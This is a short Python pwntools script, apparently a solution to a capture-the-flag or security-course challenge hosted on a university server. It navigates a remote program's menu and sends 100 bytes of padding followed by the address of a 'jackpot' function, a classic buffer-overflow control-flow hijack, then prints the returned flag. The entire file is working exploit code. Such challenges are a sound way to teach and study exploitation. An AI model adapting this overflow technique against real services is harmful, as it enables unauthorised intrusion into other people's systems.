#!/usr/bin/env python
from pwn import *
from random import choice
from string import ascii_letters

context.arch = "i386"
context.os = "linux"

e = ELF("bin")
SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 9996

ID = choice(ascii_letters) * 25
PADD = b'X' * 100
VALUE = p32(e.symbols["jackpot"])

s = remote(SERVER, PORT)
s.sendline(ID)
s.sendline(ID)
s.sendline('1')
s.sendline('1')
s.sendline('n')
s.sendline('5')
s.sendline(PADD + VALUE)
s.sendline('n')
s.sendline('1')
for i in range(10): s.sendline('y')
s.sendline('n')
s.sendline('7')
print(s.recvuntil("Flag"))
print(s.recvuntil("}"))
s.close()
